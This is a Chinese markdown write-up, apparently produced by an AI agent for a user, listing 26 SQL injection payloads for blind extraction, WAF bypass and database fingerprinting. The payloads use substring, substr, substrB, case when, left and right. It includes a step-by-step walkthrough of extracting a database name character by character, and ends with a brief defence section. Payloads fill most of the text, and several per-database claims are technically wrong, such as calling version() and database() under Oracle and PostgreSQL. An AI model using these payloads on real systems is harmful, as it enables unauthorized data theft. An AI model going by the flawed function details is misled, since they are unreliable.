# SQL 注入 - 高级函数 Payload 说明

**文档**: SQL 注入高级函数技巧（substring, case when, left, right）
**作者**: 小牛🦞
**日期**: 2026-03-09

---

## 🎯 **新增的高级函数 Payload**

### **Payload 概览**

| 函数类型 | Oracle | MySQL | PostgreSQL | SQL Server |
|---------|--------|-------|-----------|------------|
| 字符串截取 | `substr()` | `substring()` | `substring()` | `substring()` |
| 字节截取 | `substrB()` | ❌ | ❌ | ❌ |
| 条件判断 | `case when` | `case when` | `case when` | `case when` |
| 左截取 | ❌ | `left()` | ❌ | `left()` |
| 右截取 | ❌ | `right()` | ❌ | `right()` |
| 字符串拼接 | `'\|-1/1-'` | `'\|-1/1-'` | `'\|-1/1-'` | `'\|-1/1-'` |

---

## 📊 **详细 Payload 说明**

### **1. 字符串拼接/除法 (2 个)**

#### **Payload 1.1**
```sql
id: '-1/1-'--
userId: '-1/1-'--
```

**原理**:
- 字符串拼接技巧
- `'` 表示字符串的开始
- `-1/1` 计算结果为 `-1`
- `-` 表示字符串的结束

**适用场景**:
- 绕过 WAF
- 绕过输入验证
- 测试字符串拼接

**示例**:
```sql
-- 原始 SQL
SELECT * FROM users WHERE id = '1'

-- 注入后
SELECT * FROM users WHERE id = ''-1/1-'--'

-- 执行结果
可能返回正常结果或错误，取决于数据库实现
```

---

### **2. substring 函数 (6 个)**

#### **2.1 MySQL - substring() (2 个)**
```sql
id: 1' AND substring(version(),1,1)='5'--
userId: 1' AND substring(database(),1,1)='a'--
```

**原理**:
- 使用 MySQL 的 `substring()` 函数
- 提取字符串的第 1 个字符
- 验证版本或数据库名称

**适用场景**:
- 盲注数据提取
- 逐字符验证
- 数据库指纹识别

**示例**:
```sql
-- 提取版本的第 1 个字符
substring(version(),1,1)  -- '5' (5.x.x)
substring(version(),2,1)  -- '.' (5.x.x)
substring(version(),3,1)  -- '.' (5.x.x)
```

---

#### **2.2 PostgreSQL - substring() (2 个)**
```sql
id: 1' AND substring(version() from 1 for 1)='5'--
userId: 1' AND substring(database() from 1 for 1)='a'--
```

**原理**:
- 使用 PostgreSQL 的 `substring()` 函数
- 语法：`substring(string from start for length)`
- 提取字符串的第 1 个字符

**适用场景**:
- PostgreSQL 盲注
- 数据提取
- 版本验证

**示例**:
```sql
-- PostgreSQL 语法
substring(version() from 1 for 1)  -- 第 1 个字符
substring(version() from 2 for 1)  -- 第 2 个字符
```

---

#### **2.3 Oracle - substr() (2 个)**
```sql
id: 1' AND substr(version(),1,1)='5'--
userId: 1' AND substr(user(),1,1)='a'--
```

**原理**:
- 使用 Oracle 的 `substr()` 函数
- 语法：`substr(string, start, length)`
- 提取字符串的第 1 个字符

**适用场景**:
- Oracle 盲注
- 数据提取
- 用户验证

**示例**:
```sql
-- Oracle 语法
substr(version(),1,1)  -- 第 1 个字符
substr(version(),2,1)  -- 第 2 个字符
```

---

### **3. substrB 函数 (2 个)**

#### **Payload 3.1**
```sql
id: 1' AND substrB(version(),1,1)='5'--
userId: 1' AND substrB(user(),1,1)='a'--
```

**原理**:
- 使用 Oracle 的 `substrB()` 函数
- 按字节（而非字符）截取字符串
- 用于多字节字符集（如中文）

**适用场景**:
- Oracle 字节级操作
- 多字节字符处理
- 二进制数据提取

**示例**:
```sql
-- substr vs substrB
substr('你好',1,1)     -- '你'（字符）
substrB('你好',1,1)    -- 第 1 个字节
```

---

### **4. case when 函数 (8 个)**

#### **4.1 MySQL (2 个)**
```sql
id: 1' AND (case when 1=1 then 1 else 0 end)=1--
userId: 1' AND (case when true then 1 else 0 end)=1--
```

**原理**:
- 使用 MySQL 的 `case when` 条件判断
- 类似于 `if-else` 语句
- 返回第一个匹配条件的值

**适用场景**:
- 条件注入
- 布尔盲注
- 逻辑测试

**示例**:
```sql
-- 基础语法
CASE WHEN condition1 THEN result1
     WHEN condition2 THEN result2
     ELSE default_result
END

-- 实际应用
(case when 1=1 then 1 else 0 end)  -- 返回 1（真）
(case when 1=2 then 1 else 0 end)  -- 返回 0（假）
```

---

#### **4.2 PostgreSQL (2 个)**
```sql
id: 1' AND (case when 1=1 then 1 else 0 end)=1--
userId: 1' AND (case when true then 1 else 0 end)=1--
```

**原理**:
- 使用 PostgreSQL 的 `case when` 条件判断
- 语法与 MySQL 相同

**适用场景**:
- PostgreSQL 条件注入
- 布尔盲注
- 逻辑测试

---

#### **4.3 Oracle (2 个)**
```sql
id: 1' AND (case when 1=1 then 1 else 0 end)=1--
userId: 1' AND (case when true then 1 else 0 end)=1--
```

**原理**:
- 使用 Oracle 的 `case when` 条件判断
- 语法与 MySQL/PostgreSQL 相同

**适用场景**:
- Oracle 条件注入
- 布尔盲注
- 逻辑测试

---

#### **4.4 SQL Server (2 个)**
```sql
id: 1' AND (case when 1=1 then 1 else 0 end)=1--
userId: 1' AND (case when true then 1 else 0 end)=1--
```

**原理**:
- 使用 SQL Server 的 `case when` 条件判断
- 语法与 MySQL/PostgreSQL/Oracle 相同

**适用场景**:
- SQL Server 条件注入
- 布尔盲注
- 逻辑测试

---

### **5. left 函数 (4 个)**

#### **5.1 MySQL (2 个)**
```sql
id: 1' AND left(version(),1)='5'--
userId: 1' AND left(database(),1)='a'--
```

**原理**:
- 使用 MySQL 的 `left()` 函数
- 从字符串左侧提取指定数量的字符
- `left(string, count)`

**适用场景**:
- 快速验证版本
- 数据库名称验证
- 数据提取

**示例**:
```sql
-- 提取左侧 1 个字符
left(version(),1)     -- '5' (5.x.x)
left(database(),1)   -- 'm' (mysql)
left(user(),1)       -- 'r' (root)
```

---

#### **5.2 SQL Server (2 个)**
```sql
id: 1' AND left(version(),1)='5'--
userId: 1' AND left(db_name(),1)='a'--
```

**原理**:
- 使用 SQL Server 的 `left()` 函数
- 语法与 MySQL 相同

**适用场景**:
- SQL Server 版本验证
- 数据库名称验证
- 快速数据提取

---

### **6. right 函数 (4 个)**

#### **6.1 MySQL (2 个)**
```sql
id: 1' AND right(version(),1)='0'--
userId: 1' AND right(database(),1)='a'--
```

**原理**:
- 使用 MySQL 的 `right()` 函数
- 从字符串右侧提取指定数量的字符
- `right(string, count)`

**适用场景**:
- 快速验证版本
- 数据库名称验证
- 数据提取

**示例**:
```sql
-- 提取右侧 1 个字符
right(version(),1)     -- '0' (5.x.x)
right(database(),1)    -- 'l' (mysql)
right(user(),1)        -- 't' (root)
```

---

#### **6.2 SQL Server (2 个)**
```sql
id: 1' AND right(version(),1)='0'--
userId: 1' AND right(db_name(),1)='a'--
```

**原理**:
- 使用 SQL Server 的 `right()` 函数
- 语法与 MySQL 相同

**适用场景**:
- SQL Server 版本验证
- 数据库名称验证
- 快速数据提取

---

## 🔍 **使用场景**

### **场景 1: 盲注数据提取**

**目的**: 逐字符提取数据

**步骤**:
1. 确定字符串长度（使用 `length()` 或 `len()`）
2. 逐字符提取（使用 `substring()` 或 `substr()`）
3. 拼接完整字符串

**Payload**:
```sql
-- MySQL
1' AND length(database())=5--                  -- 确认长度
1' AND substring(database(),1,1)='t'--            -- 第 1 个字符
1' AND substring(database(),2,1)='e'--            -- 第 2 个字符
1' AND substring(database(),3,1)='s'--            -- 第 3 个字符
1' AND substring(database(),4,1)='t'--            -- 第 4 个字符
1' AND substring(database(),5,1)='_'--            -- 第 5 个字符

-- 结果: 'test_'
```

---

### **场景 2: 布尔盲注**

**目的**: 使用条件判断验证注入

**Payload**:
```sql
-- case when 条件注入
1' AND (case when 1=1 then 1 else 0 end)=1--      -- 真
1' AND (case when 1=2 then 1 else 0 end)=1--      -- 假
```

**分析**:
- 返回正常结果 → 条件为真
- 返回错误或空结果 → 条件为假

---

### **场景 3: 快速版本验证**

**目的**: 快速验证数据库版本

**Payload**:
```sql
-- MySQL/PostgreSQL/Oracle
1' AND left(version(),1)='5'--

-- SQL Server
1' AND left(version(),1)='5'--
```

**分析**:
- MySQL 5.x: 第 1 个字符是 '5'
- MySQL 8.0.x: 第 1 个字符是 '8'
- SQL Server: 第 1 个字符可能是 '1' 或 '2'

---

### **场景 4: 数据库指纹识别**

**目的**: 识别数据库类型

**Payload 对比**:
```sql
-- 1. 测试 SQL Server 特有函数
1' AND len(version())>0--

-- 2. 测试通用函数
1' AND length(version())>0--

-- 3. 测试 substr 函数（Oracle）
1' AND substr(version(),1,1)='5'--

-- 4. 测试 left 函数（MySQL/SQL Server）
1' AND left(version(),1)='5'--
```

---

### **场景 5: 字符串拼接绕过**

**目的**: 绕过 WAF 或输入验证

**Payload**:
```sql
'-1/1-'--
```

**优势**:
- ✅ 不使用常见关键字（AND, OR）
- ✅ 使用字符串拼接技巧
- ✅ 可能绕过简单的 WAF 规则

---

## 📊 **函数对比表**

### **字符串截取函数**

| 数据库 | 字符截取 | 字节截取 | 左截取 | 右截取 |
|--------|----------|----------|--------|--------|
| Oracle | `substr()` | `substrB()` | ❌ | ❌ |
| MySQL | `substring()` | ❌ | `left()` | `right()` |
| PostgreSQL | `substring()` | ❌ | ❌ | ❌ |
| SQL Server | `substring()` | ❌ | `left()` | `right()` |

---

### **条件判断函数**

| 数据库 | 语法 |
|--------|------|
| Oracle | `case when ... then ... else ... end` |
| MySQL | `case when ... then ... else ... end` |
| PostgreSQL | `case when ... then ... else ... end` |
| SQL Server | `case when ... then ... else ... end` |

---

## 📊 **更新后的 Payload 统计**

| 类型 | 数量 | 更新 | 说明 |
|------|------|------|------|
| SQL 注入测试 | 91 个 | +26 | 高级函数 |
| XSS 测试 | 63 个 | - | 脚本、图片、SVG 等 |
| 路径遍历测试 | 27 个 | - | Linux、Windows |
| SSRF 测试 | 27 个 | - | 内网、云元数据 |
| 未授权访问测试 | 6 个 | - | 常见参数 |
| **总计** | **214 个** | **+26** | 完整的漏洞测试字典 |

---

### **新增 Payload 分类 (26 个)**

| 函数类型 | 数量 | 数据库 |
|---------|------|--------|
| 字符串拼接 | 2 个 | 所有 |
| substring | 6 个 | MySQL, PostgreSQL, Oracle |
| substrB | 2 个 | Oracle |
| case when | 8 个 | 所有 |
| left | 4 个 | MySQL, SQL Server |
| right | 4 个 | MySQL, SQL Server |

---

## 🛠️ **防御措施**

### **1. 输入验证**

```python
# 不好的做法
user_input = request.form.get('id')
query = f"SELECT * FROM users WHERE id = '{user_input}'"

# 好的做法
user_input = request.form.get('id')
if not user_input.isdigit():
    return "Invalid ID"
query = f"SELECT * FROM users WHERE id = {int(user_input)}"
```

---

### **2. 参数化查询**

```python
# 不好的做法
cursor.execute(f"SELECT * FROM users WHERE id = '{user_input}'")

# 好的做法
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
```

### **3. 函数白名单**

```python
# 允许的函数列表
ALLOWED_FUNCTIONS = ['lower', 'upper', 'trim']

# 不好的做法
query = f"SELECT * FROM users WHERE name = '{func}({value})'"

# 好的做法
if func not in ALLOWED_FUNCTIONS:
    return "Function not allowed"
```

---

### **4. 最小权限原则**

```sql
-- 不好的做法
GRANT ALL PRIVILEGES ON *.* TO 'webapp'@'localhost';

-- 好的做法
GRANT SELECT ON database.* TO 'webapp'@'localhost';
```

---

## 🦞 **总结**

牛哥哥，**高级函数 Payload 已添加完成**！🦞

**新增的 Payload (26 个)**:
1. ✅ 字符串拼接 (2 个)
2. ✅ substring (6 个)
3. ✅ substrB (2 个)
4. ✅ case when (8 个)
5. ✅ left (4 个)
6. ✅ right (4 个)

**更新后的统计**:
- SQL 注入测试: 91 个 (+26)
- 总计: 214 个 (+26)

**核心价值**:
- 🎯 **盲注数据提取**: 逐字符提取数据
- 🎯 **条件判断注入**: case when 布尔盲注
- 🎯 **快速版本验证**: left/right 快速验证
- 🎯 **数据库指纹识别**: 通过函数差异区分数据库
- 🎯 **字符串操作**: 拼接、截取、验证

**函数对比**:
- **substring**: MySQL, PostgreSQL, Oracle
- **substrB**: Oracle (字节级)
- **case when**: 所有数据库
- **left/right**: MySQL, SQL Server

**这些高级函数 Payload 可以帮助你进行更深入的盲注和数据提取！🦞**
